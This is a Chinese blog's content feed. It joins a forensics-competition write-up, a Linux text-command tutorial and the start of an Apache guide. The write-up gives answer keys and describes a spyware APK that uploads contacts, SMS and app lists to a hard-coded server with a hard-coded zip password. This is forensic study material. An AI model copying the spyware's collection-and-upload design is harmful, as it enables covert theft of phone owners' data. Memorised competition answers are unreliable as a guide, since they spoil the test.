/b用来后台启动mysql的服务程序，这样他就不会一直占用当前的窗口了\n这里使用的是mysqld，最好去配置一下环境变量，省得每次都要在bin文件里面使用\n启动之后使用下面的命令登录：\nmysql -u root -P 4141 -h 127.0.0.1 -h和-P（大写）用来指定ip地址和端口，没改的话就不用写了\n如果登陆成功，那么恭喜，连接成功了，我们可以使用下面的命令简单检查一下配置文件有没有顺利生效：\nSHOW VARIABLES LIKE \u0026#39;datadir\u0026#39; 查询结果应该是之前我们写入配置文件的data目录路径\n到这里都没有问题的话，就可以直接使用navicat连接了，输入之前指定的端口号和ip（回环地址127.0.0.1）即可\n这个文件里面一共就一个自定义数据库“人员”，其余四个都是mysql自带的\n我们在名为mysql的数据库里面找到user表，就能看见每个用户修改密码的信息，第一行是root的：\n2021-03-17.15:49:52 4.请问mysql数据库中共存在多少个数据库（标准格式：阿拉伯数字） 见上题，1+4\n5 5.员工编号为204200的员工总工资为多少元（标准格式：阿拉伯数字） 人员数据库的salaries_list表用来记录工资信息\n这里比较坑爹的一点是，每一个员工有不止一条数据，还好先翻了翻\nselect sum(salary) from salaries_list where emp_no = 204200; 488313 6.Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名（标准格式：阿拉伯数字） 入职信息记录在hiredate表中，在team_list能知道Finance对应的门牌号(?)是d002，依据这个查找\nselect count(*) from hiredate where dept_no = \u0026#39;d002\u0026#39; and from_date \u0026gt;= \u0026#39;1999-01-01\u0026#39;; 1486 7.请问邮箱服务器的登录密码是多少（标准格式：admin） 什么是邮箱服务器？那就当他问邮箱登录密码了：\n不过一共登陆过两个账号，不知道问的哪一个\n900110 123456 *标准答案是第一个\n900110 8.邮件服务器中共有多少个账号（标准格式：阿拉伯数字） 不就两个吗\n2 *饿啊我错了，原来真的没有这么简单\n在hMailServer/Data/longxin.com下面能找到完整的登录记录，一共三个：\n不是这啥啊，怎么找到的这玩意，hMailServer又是哪里蹦出来的，不应该是foxmail吗，搞不懂\n9.邮件服务器中共有多少个域名（标准格式：阿拉伯数字） 这问的又是什么玩意，可能是之前看到的接收服务器？\n两个号共用一个\n2 好吧我做错了，但我还是不知道怎么辨别有几个服务器\n10.请问约定见面的地点在哪里（标准格式：太阳路668.号） *这题没做出来，看答案说是图片瘾写，这也是我第一次在取证里看见图片隐写\n首先可以在来往邮件里面看见他们发送了一张图片，是一张不明所以的蜡笔小新：\n以后看到这样突兀的图片应该警惕一下了\n在如下位置找到它，导出：\n这是jpg的宽高修改隐写\n首先我们要知道，JPEG文件格式里有一个标记段叫做SOF0，全称是Start of Frame 0\n它的作用是描述图像的基本信息，比如宽度、高度、颜色分量等，是jpg解码器必须读取的关键段，格式如下：\n字节数 内容 说明 2 FFC0 SOF0标记 2 段长度 包括接下来的所有字节长度 1 精度 每个样本的位数，一般8 2 高度 图像高度（像素） 2 宽度 图像宽度（像素） 1 颜色分量数量 1=灰度，3=RGB/YUV 3×N 各分量信息 每个分量的ID、采样因子、量化表号 这里我使用010editor打开，搜索十六进制FFC0找这个标记段：\n之后的第4、5字节是高度，现在是0x03AC = 3*256 + 172 = 940px，改成04AC：\n另存打开，就能看见下面隐藏的信息：\n中国路999号 APK部分 1.APP包名是多少（标准格式：com.xxx.xxx） 导入jadx：\npackage com.example.readeveryday; 2.apk的主函数名是多少（标准格式：comlongxin） 查看AndroidManifest.xml：\nStartShow 3.apk的签名算法是什么（标准格式：xxx） 查看APK signature：\nSHA1withRSA 4.apk的应用版本是多少（标准格式：1.2） 依旧查看AndroidManifest.xml：：\n1.0 5.请判断该apk是否需要联网（标准格式：是/否） 这行代码是向安卓系统申请访问互联网的权限\n是 6.APK回传地址？（标准格式：127.0.0.1:12345） 在MainActivity类里面找到如下函数：\n10.0.102.135:8888 *雷电app分析也能检测出来：\n7.APK回传数据文件名称是什么（标准格式：1.txt） 在MainActivity的checkAndUpload方法中，代码构建了HTTP请求来上传文件，其中Content-Disposition头部信息指定了上传服务器时所使用的文件名：\nReaddata.zip 8.APK回传数据加密密码是多少（标准格式：admin） 依旧MainActivity类，在EncryFile方法中，代码将收集到的信息文件readdata.xml进行加密压缩，加密密码被写死在了代码中：\n19_08.05r 9.APK发送回后台服务器的数据包含以下哪些内容？（多选） A.手机通讯录\nB.手机短信\nC.相册\nD.GPS定位信息\nE.手机应用列表\n依旧MainActivity类，在onCreate方法里调用了三种收集信息的函数：\n分别查看细节逻辑，就能知道采集的信息是什么\ngetContactInfo：通讯录\ngetSmsInPhone：短信\ngetExternalStorageDirectory：应用列表\n并且代码中没有发现任何与读取相册或获取GPS定位信息相关的代码逻辑，应该就这三个了\nABE *雷电app分析直接一键扒下来底裤了：\n手机部分 1.IOS手机备份包是什么时候开始备份的（标准格式：2024-01-20.12:12:12) 答案是ios镜像压缩包的名称：\n2024年01月15日_14时19分44秒 标准格式：\n2024-01-15.14:19:44 *正确解法（存疑）是去翻找检材同目录下的log文件，得到的答案是一样的：\n2024-01-15.14:19:44 2.请分析，该手机共下载了几款即时通讯工具（标准格式：阿拉伯数字） 筛选后可以发现一共两个：\n这里还漏了一个，之后题目还有提到小西米语音，这个软件没有被标记为即时通信：\n3 3.手机机主的号码得ICCID是多少（标准格式：阿拉伯数字） 89860320245121150689 4.手机机主登录小西米语音的日期是什么时候（标准格式：20240120） 查看网络连接情况，之前我们知道了小西米语音的包名是com.titashow.tangliao：\n20240115 *这样做有些问题，正确解法应该是查看授权日志，第一次进入应该有授权\n*不过我觉得还是不对，最后想到了看短信，短信里面有验证码，就是登录当天的日期：\n20240115 5.请问嫌疑人家庭住址在哪个小区（标准格式：松泽家园） 火眼分析的高德地图下有一个解密的数据库：\n打开后找到这样一条最像是住所的记录：\n天铂华庭 6.Safari浏览器书签的对应数据库名称是什么（标准格式：sqltie.db) 随便点开一个书签，查看路径：\nBookmarks.db 7.手机机主计划去哪里旅游（标准格式：苏州） 查看Safari搜索历史：\n拉萨 8.手机机主查询过那个人的身份信息（标准格式：龙信） *这题开始就不会了，后面记录一下正确的解题过程：\n手机里有这样的一张图片（我的火眼不知道为什么看不了图，这辈子做不出来）：\n要查找的应该就是这个手机号对应的人，记下来全局搜索这个手机号： 第一个就是存有这段聊天记录的数据库：\n龙黑 9.请问机主共转多少费用用于数据查询（标准格式：1000） 还是上题的数据库，可知机主一共查了十一个人，一人100，总费用1100：\n1100 10.机主查询的信息中共有多少男性（标准格式：阿拉伯数字） 在短信里面能找到有人发了这样一张图片：\n身份证号码倒数第二位为性别，奇数为男性、偶数为女性\n最后2个身份证缺少了几位无法辨别，前面男性一共4个人\n2 ","date":"2025-09-03T20:08:27+08:00","image":"http://picture.928330.xyz/typora/b35ad24065e047f6a4dc4b3474ddeb4b.png","permalink":"https://blog.928330.xyz/p/%E7%8D%AC%E8%B1%B8%E6%9D%AF2024%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"獬豸杯2024取证总结"},{"content":"迟来的第二篇！其实我早就写好了，忘记发了\n这一篇还是挺重要的，包括$符号、重定向等等，算是解决了之前看别人写的命令的很多疑惑\n第一篇看这里：Linux命令（文件管理篇） echo —— 在终端显示一行文本或变量 主要功能是将紧跟在它后面的字符串或变量的值输出到标准输出\n语法格式 echo [参数] \u0026lt;字符串\u0026gt; Shell的解析 echo在实际执行之前，Shell会先对命令行进行解析，处理各种扩展规则\n这使得echo的行为不仅取决于它的参数内容，还取决于这些参数是如何写的\n命令解析顺序 Shell 在执行echo命令之前，会按照以下顺序解析命令行内容：\n变量替换，例如$USER、$HOME等会被替换成当前环境中相应的值 命令替换，例如$(date) 或date会被替换为命令执行后的输出结果 路径通配符，如*.txt 引号的解析和空格的处理 关于$使用方法移步：[$符号的使用](#echo扩展：$ —— Shell中的特殊元字符)\n使用双引号 \u0026quot; \u0026quot; —— 弱引用 双引号内部的内容保留大部分字面意义，但允许进行变量和命令替换\necho \u0026#34;Hello $USER, today is $(date)\u0026#34; $USER被替换成当前用户名，$(date)被替换成当前系统时间，输出结果可能是：\nHello bob, today is Tue Jul 30 20:00:00 JST 2025 双引号还可以保留字符串中的空格，例如：\necho \u0026#34;Hello World\u0026#34; 会输出：\nHello World 使用单引号 \u0026rsquo; \u0026rsquo; —— 强引用 单引号内部的所有内容都按字面含义处理，禁止任何形式的变量和命令替换\necho \u0026#39;Hello $USER, today is $(date)\u0026#39; 输出结果为：\nHello $USER, today is $(date) 即完全照原样输出，不做任何解析\n不使用引号 不加引号的参数会被Shell正常解析，包括变量和命令替换，但有两个值得注意的特点：\n多个空格会被压缩为一个 如果参数中有特殊字符或空格，Shell会认为它们是分隔符或命令符号 echo Hello $USER 输出类似：\nHello bob 空格被压缩了，只显示一个空格\n常用参数 核心功能 参数 功能说明 -n 不在末尾输出自动的换行符 -e 启用对反斜杠转义字符的解释，例如，\\n会被解释为换行，\\t会被解释为制表符 -E 显式地禁用对反斜杠转义字符的解释（通常是默认行为） 使用示例 显示简单的文本字符串\necho \u0026#34;Hello, Linux World!\u0026#34; 使用转义字符进行格式化输出\necho -e \u0026#34;Files found:\\n\\t- /path/to/file1.txt\\n\\t- /path/to/file2.txt\u0026#34; 输出：\nFiles found: - /path/to/file1.txt - /path/to/file2.txt echo扩展：$ —— Shell中的特殊元字符 $符号本身并不是一个命令，而是Linux Shell中的一个特殊元字符\n它的核心功能是进行扩展，即将其后面的内容替换成别的值，例如变量的值或命令的执行结果\n变量引用 引用普通变量 name=\u0026#34;linux\u0026#34; echo $name 上面的命令将会输出linux\n引用环境变量 echo $HOME # 当前用户的主目录 echo $HOSTNAME # 当前主机名 echo $PATH # 可执行程序搜索路径，即/bin和/sbin echo $SHELL # 默认shell类型 echo $USER # 当前用户名 echo $UID # 当前用户ID 顺便提一嘴，查看环境变量有哪些可以使用printenv、env、set\n避免歧义 ${}的写法在变量名后紧跟其他字符时可避免歧义：\necho ${name}123 上面的命令将会输出linux123\n命令替换 使用$() echo $(date) 先执行date命令，再将其输出替换到echo\n使用反引号 echo `date` 推荐使用$()，因为可嵌套\n算术扩展 使用双重括号(())包裹表示算术表达式：\n$((表达式)) 可进行整数运算：\necho $((1+2)) 上面的命令将会输出输出3\n也可以定义变量：\nx=5 echo $((x*2)) 上面的命令将会输出10\n特殊变量 Shell内置有很多特殊变量，用$引用，一般在脚本里面使用，方便脚本编写：\n变量名 含义说明 示例值 / 用法 $0 当前脚本的名称 ./myscript.sh $1~$9 脚本的第1到第9个参数 $1是第1个参数 ${10} 第10个及以上的参数，必须使用大括号 ${10} $# 传递给脚本的参数个数 3 表示有三个参数 $@ 以独立字符串形式表示所有参数 \u0026quot;arg1\u0026quot; \u0026quot;arg2\u0026quot; \u0026quot;arg3\u0026quot; $* 以一个整体字符串形式表示所有参数 \u0026quot;arg1 arg2 arg3\u0026quot; $$ 当前Shell进程的PID 13542 $! 最近一次后台运行的进程PID 18321（如sleep 10 \u0026amp;后的进程号） $? 上一条命令的退出状态（0 表示成功，非 0 失败） 0表示成功，1表示失败 $- 当前Shell启动时使用的选项 如himBH表示启用了哪些选项 $_ 上一条命令中的最后一个参数 比如刚运行cp file1 file2，则为file2 字符串处理 $结合{}可进行多种扩展操作：\n默认值处理 表达式 含义 ${var:-word} 如果var未设置或为空，返回word ${var:=word} 如果var未设置或为空，返回word并将其赋值给var ${var:?message} 如果var未设置或为空，输出message到标准错误，并中止脚本 ${var:+word} 如果var设置了值，返回word，否则返回空 eg：\necho ${var:-default} var未定义或为空时输出default\n字符串长度 语法：\n${#变量名} 这是一种字符串长度计算语法，会计算变量名中字符串的字符数\neg：\nstr=\u0026#34;linux\u0026#34; echo ${#str} 上面的命令会输出5\n子串截取 语法：\n${变量名:起始位置:长度} ${变量名:起始位置} 起始位置0开始计数 若不指定长度，则截取到末尾 若起始位置为负数，从右往左数 eg：定义字符串str=\u0026quot;linuxsystem\u0026quot;\necho ${str:0:5} 输出linux，从位置0开始，截取5个字符\necho ${str:5} 输出system，从位置5开始截到末尾\n子串删除 语法 含义 ${变量%模式} 从变量值末尾开始，删除最短匹配的 模式 ${变量%%模式} 从变量值末尾开始，删除最长匹配的 模式 ${变量#模式} 从变量值开头开始，删除最短匹配的 模式 ${变量##模式} 从变量值开头开始，删除最长匹配的 模式 eg：\npath=\u0026#34;/home/user/file.txt\u0026#34; echo ${path%/*} ：输出/home/user echo ${path##*/} ：输出file.txt\ncat —— 连接文件并打印到标准输出 cat命令是Linux中一个非常基础且功能强大的文本文件处理工具\n它的名称是concatenate(连接)的缩写，其核心功能是将一个或多个文件的内容连接起来，并将其输出到标准输出(通常是终端屏幕)\n语法格式 cat [参数] \u0026lt;文件名1\u0026gt; \u0026lt;文件名2\u0026gt;... Linux标准输入输出与重定向 标准输入输出 在Linux中，命令运行时默认会关联三个数据流：\n标准输入(stdin)：命令获取数据的默认来源，一般是键盘输入，文件描述符为0 标准输出(stdout)：命令输出结果的默认目的地，一般是终端屏幕，文件描述符为1 标准错误(stderr)：命令的错误信息输出的默认目的地，也是终端屏幕，文件描述符为2 例如执行cat file.txt，程序会从标准输入中读取文件内容并写到标准输出，因此屏幕上可以看到结果\n使用\u0026amp;+文件描述符，可以表示对应输入输出的位置，比如\u0026amp;1就是标准输出当前所在的位置，类似指针\n重定向操作符 重定向是指把命令的标准输入或标准输出指向到其他位置（如文件），常见用法包括：\n\u0026gt;：把命令的标准输出重定向到指定文件，如果文件存在，会覆盖原内容，默认作用于标准输出(stdout)\necho \u0026#34;Hello\u0026#34; \u0026gt; test.txt 上面命令会把字符串写入test.txt，覆盖其原有内容\n因为\u0026gt;默认作用于stdout，也就是说平时代表标准输入的1省略了，他等价于：\necho \u0026#34;Hello\u0026#34; 1\u0026gt; test.txt 注意1和\u0026gt;之间不能有任何空格，否则会被解析成echo后字符串的一部分，对于0和2也是一样\n还可以使用空的内容重定向文件，快速做到清除文件：\n\u0026gt; test.txt 经过我的测试，这个效果和cat \u0026gt; test.txt一样，执行之后要手动ctrl+c退出，不然输入的内容就写进去了，或许不同系统有不同效果吧\n\u0026gt;\u0026gt;：把命令的标准输出以追加方式重定向到指定文件，不会覆盖原内容\necho \u0026#34;World\u0026#34; \u0026gt;\u0026gt; test.txt 上面命令会把字符串追加到test.txt的末尾\n\u0026lt;：把标准输入重定向为某个文件内容\ncat \u0026lt; test.txt 上面命令会从test.txt读取数据作为标准输入并显示在屏幕，结果上等同于cat test.txt\n不过我们一般不这样使用，而是结合其他命令：\nsort \u0026lt; test.txt 上面命令会对test.txt内容排序后输出\n\u0026lt;\u0026lt;：启动多行输入模式（HereDocument）\ncat \u0026lt;\u0026lt; EOF 上面命令会把接下来的多行内容作为标准输入，直到遇到EOF标识符，这个标识符是自己定义的\n2\u0026gt;：把命令的标准错误流（stderr）重定向到指定文件，如果文件存在，会覆盖原内容\nls nofile.txt 2\u0026gt; error.log 上面命令会把ls的错误信息写入到error.log文件中，而不是显示在屏幕上\n2\u0026gt;\u0026gt;：把命令的标准错误流以追加方式重定向到指定文件，不会覆盖原内容\nls nofile.txt 2\u0026gt;\u0026gt; error.log 上面命令会把错误信息追加到error.log文件末尾\n2\u0026gt;\u0026amp;1：把标准错误重定向到标准输出的位置（合并到一起）\nyourcommand \u0026gt; log 2\u0026gt;\u0026amp;1 上面命令会把标准输出和标准错误都写入到log文件中（先把标准输出重定向到log，再把标准错误重定向到标准输出，也是log）\n同样的，\u0026gt;和\u0026amp;1之间不能有空格，否则\u0026amp;1会被当成文件名处理\n\u0026amp;\u0026gt;：同时重定向标准输出和标准错误流到指定文件\nyourcommand \u0026amp;\u0026gt; log 上面命令也会把标准输出和标准错误都写入到log文件中，一步到位，但只在bash或zsh等兼容shell中有效，老的sh不支持\n上面我们提到的重定向都是针对当前的命令，如果想要对整个当前shell都生效，必须用exec重定向：\nexec \u0026amp;\u0026gt; log 这样之后在这个shell里的所有输出都会写进log，直到恢复或退出\n常用参数 参数 功能说明 -n 从1开始为所有输出行编号 -b 与-n类似，但只为非空行编号 -s 当遇到有连续两行以上的空白行，就代换为一行的空白行 -E 在每行结束处显示一个$符号 -T 将Tab制表符显示为^I -v 显示不可打印字符（除了换行符和 Tab） -e 等价于-vE：显示不可见字符，行尾加$ -A 等价于-vET：显示不可见字符，行尾加$，Tab制表符显示为^I 使用示例 同时查看并合并多个文件的内容\ncat file1.txt file2.txt cat会按照参数顺序，将file1.txt和file2.txt的内容连续地打印到屏幕上\n创建新文件\ncat \u0026gt; new_file.txt # 执行该命令后，光标会停留在下一行等待输入 # 输入想要的内容，例如： Hello, world.This is a new file. # 按下 Ctrl + C 组合键来保存并退出 这里cat因为没有指定文件名，所以从键盘（标准输入）读取内容，而\u0026gt;将这些内容重定向到了new_file.txt文件中\n也可以使用\u0026lt;\u0026lt;指定标识符：\ncat \u0026gt; file.txt \u0026lt;\u0026lt; END # 输入想要的内容，例如： Hello World END # file.txt的内容会变成： Hello World 合并多个文件为一个新文件\ncat part1.log part2.log \u0026gt; full.log 向文件末尾追加内容\ncat \u0026gt;\u0026gt; file.txt # 输入内容 # 按下 Ctrl + C 结束 也可以使用\u0026lt;\u0026lt;指定标识符：\ncat \u0026gt;\u0026gt; file.txt \u0026lt;\u0026lt; END 显示文件内容并附带行号\ncat -n file tac —— 逆序连接并打印文件内容 tac的名称非常直观，就是cat命令的反写，核心功能也与cat正好相反：cat从第一行开始正序显示文件内容，而tac则从最后一行开始逆序显示文件内容\n语法格式 tac [参数] \u0026lt;文件名\u0026gt; tac的基本执行流程 读取整个文件的内容 tac通常是先读取完整个文件（或标准输入）到内存中（或者内部缓冲区） 按分隔符拆分内容 默认分隔符是换行符\\n，也可以用-s指定其他分隔符 如果使用了-r，分隔符则是一个正则表达式，用于匹配多种分隔符 tac会把文件内容按照分隔符切分成若干“块” 倒序输出这些块 按块的顺序从最后一个块开始输出到第一个块 在每两个块之间加上分隔符，默认情况下，分隔符附加在块内容的后面（块后） 如果加了-b，分隔符放在块内容前 输出拼接成最终倒序结果 输出每个块以及分隔符，形成完整倒序后的文本 常用参数 不同于cat，tac的参数非常少\n参数 功能说明 -b 在每行内容之前附加分隔符（默认为换行符） -r 将分隔符当作正则表达式来处理 -s \u0026lt;字符串\u0026gt; 使用指定的字符串作为记录分隔符，而不是默认的换行符 使用示例 tac命令的几个用法都有些难以理解，这里我们举几个具体的例子\n假设我们有一个numbers.txt文件，内容如下：\nOne,Two Three 执行tac命令，块分割是One,Two和Three，按照块2 - 分隔符 - 块1的倒序，输出结果将会是：\nThree \\n One,Two ↓ Three One,Two 如果使用-b参数，让分隔符输出在块之前，按照分隔符 - 块2 - 块1的顺序，输出结果将会是：\n\\nThree One,Two ↓ ←注意这一行是\\n造成的 ThreeOne,Two 如果使用tac -s , ，即使用,作为分隔符，块分割将会变成One和Two\\nThree\\n（注意最后一行末尾也是有换行符的），按照块2 - 分隔符 - 块1的倒序，输出结果将会是：\nTwo\\nThree\\n,One ↓ Two Three ,One 如果使用-b参数，让分隔符输出在块之前，按照分隔符 - 块2 - 块1的顺序，输出结果将会是：\n,Two\\nThree\\nOne ↓ ,Two Three One 查找文件中最后一次出现某个模式的行\ntac log | grep -m 1 \u0026#34;ERROR\u0026#34; 执行流程：\ntac log: 首先将整个日志文件按行逆序，最新的日志现在在最上面 |: 将逆序后的内容通过管道传递给grep grep -m 1 \u0026quot;ERROR\u0026quot;: 在逆序的输出中，查找第一个匹配“ERROR”的行，因为文件已经逆序，所以这个“第一个”匹配的行实际上是原始文件中的最后一个，-m 1确保grep在找到后立即停止 less \u0026amp; more —— 分页显示文本文件内容 less和more 是Linux中用于分页查看长文本文件的命令\n当一个文件的内容超过一屏时，使用cat会瞬间刷满屏幕导致无法看清前面的内容，此时就应该使用less或more\n语法格式 使用方式相同：\nmore/less [参数] \u0026lt;文件名\u0026gt; 从more到less的演进 more more是Unix系统中最早的分页查看工具，意思是“更多”，表示“继续显示更多内容”\n它允许用户分屏浏览文本文件或命令输出，默认一页一页地显示内容\n但它的功能简单，交互有限，只能向下翻页（按空格键或回车键），不支持向上滚动回看已经滚过的内容\nless less是对more的改进版本，它其实是开玩笑地取名，含义是“less is more”（少即是多）\n改进点：\n支持双向滚动（上下翻页都能用） 支持搜索、跳转、更丰富的交互 处理大文件更高效，打开大文件时速度更快，因为它不会一次性将整个文件读入内存 在几乎所有的现代Linux发行版中，less已经完全取代more成为默认和推荐的分页器\n交互模式下的常用按键 当我们使用less/more打开一个文件后，就进入了它的交互模式，可以使用按键进行操作\nmore 按键 功能 空格键 / f 向下翻一页 b 向上翻一页**（部分版本支持）** Enter键 向下滚动一行 /pattern 向下搜索字符串pattern less 按键 功能 空格键 / f 向下翻一页 b 向上翻一页 Enter键 / j / ↓ 向下滚动一行 k / ↑ 向上滚动一行 G 直接跳转到文件末尾 g 直接跳转到文件开头 d 向下滚动半页 u 向上滚动半页 /pattern 向下搜索字符串pattern ?pattern 向上搜索字符串pattern n 跳转到下一个搜索匹配项 N 跳转到上一个搜索匹配项 q 退出less h 显示帮助菜单，列出所有可用按键 常用参数 more 参数 说明 -d 显示“按空格继续，q退出”的提示信息 -c 每次显示前清屏 -s 合并连续多个空行为一行 -num 设置每次显示的行数（如-20表示20行） -f 统计行数时，连同换行符一起计算 less 参数 说明 -N 显示行号 -S 不自动换行，横向超出屏幕的内容用→标示 -X 退出时不清屏，保留显示内容 -z N 指定滚动的页面行数N -i 搜索时忽略大小写 -I 搜索时忽略大小写，且搜索模式固定 -p pattern 启动后直接跳转到第一个匹配pattern的地方 -F 如果内容只有一屏，直接退出 less -R 显示颜色转义序列（保留颜色） 学习过vim编辑器的肯定会发现less和vim操作有许多相似之处，也的确如此 —— 他们都是vi编辑器的后辈\n什么？你还没有学过vim？点击即送免费课堂！ \u0026ndash;\u0026gt; vim完全使用教程 使用示例 查看一个长文件\nless/more log 分页查看命令输出\nls -alh /etc | less/more 查看文件并显示行号（less独有）\nless -N log 设置每页显示的行数（more独有）\nmore -20 log 在文件中进行搜索\nless log 操作流程：\n使用less打开文件后，直接按/键 输入想搜索的关键词（例如ERROR），再按回车 less会高亮显示第一个匹配项，可以按n键跳转到下一个匹配项，按N键跳转到上一个 head —— 从文件头部查看内容 与cat不同，其核心功能是显示指定文件开头的部分内容\n语法格式 head [参数] \u0026lt;文件名\u0026gt; 常用参数 核心功能 参数 功能说明 -n \u0026lt;行数\u0026gt;\n或 -\u0026lt;行数\u0026gt; 显示文件的开头N行 -c \u0026lt;字节数\u0026gt; 按字节数显示文件的开头内容，而不是按行数 控制与输出 参数 功能说明 -q 当处理多个文件时，不显示每个文件名前的头部标签 -v 总是显示文件名头部标签 使用示例 查看文件的开头10行\nhead file 在不指定行数时，默认显示文件的开头10行\n查看文件的开头5行\nhead -n 5 /etc/hosts 也可以使用下面的简写形式，效果完全一样：\nhead -5 /etc/hosts 查看多个文件的头部标签\nhead -n 3 file1.txt file2.txt 当head处理多个文件时，它会默认在每个文件的内容前显示文件名作为标题（如==\u0026gt; file1.txt \u0026lt;==），方便区分\ntail —— 从文件尾部查看内容 与head命令正好相反，tail的核心功能是显示指定文件末尾的部分内容\n语法格式 tail [参数] \u0026lt;文件名\u0026gt; Linux日志监控 tail命令之所以重要，是因为它完美地契合了Linux系统管理的常见需求——日志监控\n在Linux系统中，应用程序和系统服务的日志通常是不断增长的文本文件，最新的内容总是在文件末尾 tail命令最强大的功能之一就是能够实时地跟踪一个文件的末尾 当新内容被追加到文件中时（例如，一条新的日志记录被写入），tail可以立即将其显示在终端上，这使其成为系统管理员和开发者监控程序状态和排查问题的必备工具 Linux管道与命令组合 管道|的作用是将前一个命令的标准输出直接作为后一个命令的标准输入 错误信息默认不会被传递，如果要传递错误输出，可用2\u0026gt;\u0026amp;1合并，比如命令1 2\u0026gt;\u0026amp;1 | 命令2 head和tail命令经常在管道中组合使用，以精确地提取出文件的中间部分 常用参数 核心功能 参数 功能说明 -n \u0026lt;行数\u0026gt;\n或 -\u0026lt;行数\u0026gt; N是正整数：显示文件的末尾N行\nN是带+的数字：从文件第N行开始输出到文件结尾（不能使用-\u0026lt;行数\u0026gt;形式） -f **持续监控并显示文件的追加内容\n**当文件增长时，新内容会实时显示出来。按Ctrl+C退出 -F **与-f类似，但更强大\n**当被监控的文件被重命名或删除后重新创建时，-F能够智能地重新打开新文件并继续监控 -c \u0026lt;字节数\u0026gt; 按字节数显示文件的末尾内容，而不是按行数 控制与输出 参数 功能说明 -q 当处理多个文件时，不显示每个文件名前的头部标签 -v 总是显示文件名头部标签 使用示例 查看文件的最后10行\ntail file.txt 在不指定行数时，默认显示文件的末尾10行\n从第10行开始查看文件到结尾\ntail -n +10 file.txt 查看error.log文件的最后100行\ntail -n 100 error.log 也可以使用下面的简写形式，效果完全一样：\ntail -100 error.log 持续监控Nginx访问日志文件\ntail -f /var/log/nginx/access.log 每当有新的访问请求被记录下来，该条日志就会立即显示在终端上，按Ctrl+C可以停止监控\n查看一个日志文件的第101行到110行\nhead -n 110 log | tail -n 10 head -n 110 large_file.log 先取出文件的前110行内容 | (管道符) 将这110行内容作为输入，传递给下一个命令 tail -n 10 接收到这110行内容，并从中取出最后的10行 最终，屏幕上显示的就是原始文件的第101行到第110行 tee —— 从标准输入读取并同时写入到标准输出和文件 tee的名称来源于水管工程中的T型三通管，功能也与之类似：\n它从标准输入读取数据，然后将其一分为二，一份输出到标准输出，另一份输出到一个或多个文件中\n语法格式 tee命令几乎总是与管道符|结合使用，收前一个命令的输出作为自己的输入\n\u0026lt;某个命令\u0026gt; | tee [参数] \u0026lt;文件名\u0026gt; Linux管道中的“三通管” 可以把tee的处理想象一个水管的T型三通接头：\n┌────\u0026gt; stdout（屏幕） stdin ───┤ └────\u0026gt; 文件 数据流（就像水流）通过管道|流入tee命令，而tee命令就像这个三通接头，它将数据流一分为二：\n一股水流继续沿着管道向下流，流向标准输出（您的屏幕） 另一股水流从T字的侧口流出，被导入到一个或多个文件中 这个特性使得我们可以在不中断管道流的情况下，既能实时查看命令输出，又能将其保存到文件中\n常用参数 参数 功能说明 -a 追加模式，将内容追加到指定文件的末尾，而不是覆盖原有内容 -i 忽略中断信号（Ctrl+C），在长时间运行的管道任务中避免意外中断 使用示例 查看ls -l命令输出并同时保存到文件\nls -l | tee file.txt 追加内容到日志文件\necho \u0026#34;this is a message\u0026#34; | tee -a log 结合sudo向需要root权限的文件写入内容\necho \u0026#34;127.0.0.1 myapp.local\u0026#34; | sudo tee -a /etc/hosts 执行流程：\n不能直接使用sudo echo \u0026quot;...\u0026quot; \u0026gt;\u0026gt; /etc/hosts，因为输出重定向\u0026gt;\u0026gt;是由当前的普通用户Shell执行的，它没有权限写入/etc/hosts 而在这个命令中，管道|将echo的输出传递给tee命令 tee命令是在sudo的权限提升作用下运行的，可以将从管道接收到的内容写入到/etc/hosts中 将输出保存到多个文件\ndate | tee date_log1.txt date_log2.txt ","date":"2025-08-27T14:12:37+08:00","image":"http://picture.928330.xyz/typora/fcc033dfd187d8eb0d29169a672d75ce.jpg","permalink":"https://blog.928330.xyz/p/linux%E5%91%BD%E4%BB%A4%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E4%B8%8E%E6%9F%A5%E7%9C%8B%E7%AF%87/","title":"Linux命令（文件写入与查看篇）"},{"content":"时隔一个月，又来学服务器了\n其实是因为美亚杯做到了apache相关内容啦\n猜你喜欢：Nginx入门 何为Apache Apache HTTP Server（简称Apache，或httpd，使用时为Apache2）是Apache软件基金会的一个开源网页服务器项目\n自1995年发布以来，它凭借其稳定性、强大的功能、丰富的模块和跨平台特性，一度成为全球使用最广泛的Web服务器\n它的核心优势在于其高度模块化的设计，几乎所有功能，从SSL加密(mod_ssl)、URL重写(mod_rewrite)到与各种后端语言（如PHP的mod_php）的集成，都是通过模块实现的，这使得Apache具有极高的灵活性和可扩展性\nNginx vs Apache 在之前，我们介绍了如何使用nginx：Nginx入门 那么它和apache之间究竟有什么区别？\n核心架构 这是两者最根本的区别\nApache 采用基于进程或线程的模型，它有多种工作模式（MPM），如prefork（每个请求一个进程）和worker/event（每个请求一个线程）\n这种模型对于每个连接都会消耗一定的系统资源，在高并发下内存占用较高\nNginx 采用事件驱动的异步非阻塞架构\n它用极少数的工作进程就能处理成千上万的并发连接，资源消耗极低，特别擅长应对高并发和处理静态资源\n功能与生态 Apache 历史悠久，功能模块极其丰富，生态系统成熟\n对于动态内容（如PHP），其mod_php模块直接在Apache进程内执行，处理流程简单直接\n它的.htaccess文件提供了强大的目录级配置能力，让开发者无需修改主配置就能调整行为\nNginx 核心功能是高性能的HTTP服务和反向代理\n它的模块化设计虽然也很强大，但通常更侧重于性能和网络层面\n它不支持.htaccess，所有配置集中管理，性能更高，也更符合现代运维理念\n总的来说：\nApache稳定、功能全面，对动态内容支持极佳\nNginx轻量、高效，在高并发、静态资源和反向代理场景下更好用\n在现代架构中两者常常协同工作，用Nginx处理静态资源和代理，后端再由Apache处理复杂的动态业务逻辑\nApache的主要用法 Web服务器 直接向客户端提供静态（HTML, CSS, 图片）和动态（PHP, Perl, Python）内容的服务\nApache对动态内容的原生支持非常出色，是许多传统Web应用（如WordPress, Joomla）的首选平台\n反向代理服务器 通过mod_proxy模块，Apache可以作为客户端和后端应用服务器之间的中间人，实现请求转发、负载均衡，并隐藏后端服务细节\n负载均衡器 配合mod_proxy_balancer模块，Apache可以将接收到的请求分发到后端的多台服务器上，从而提高网站的可用性和处理能力\n访问控制与URL重写 强大的.htaccess和mod_rewrite功能，使其在URL美化（伪静态）、访问权限控制等方面表现非常灵活\n目录结构 和nginx一样，不同发行版和安装方式的apache的目录结构有差异，只不过apache的差异更为显著\n与nginx不同，apache官方一般只提供二进制编译安装的文件，.deb文件更多是交给第三方打包\n源码编译安装 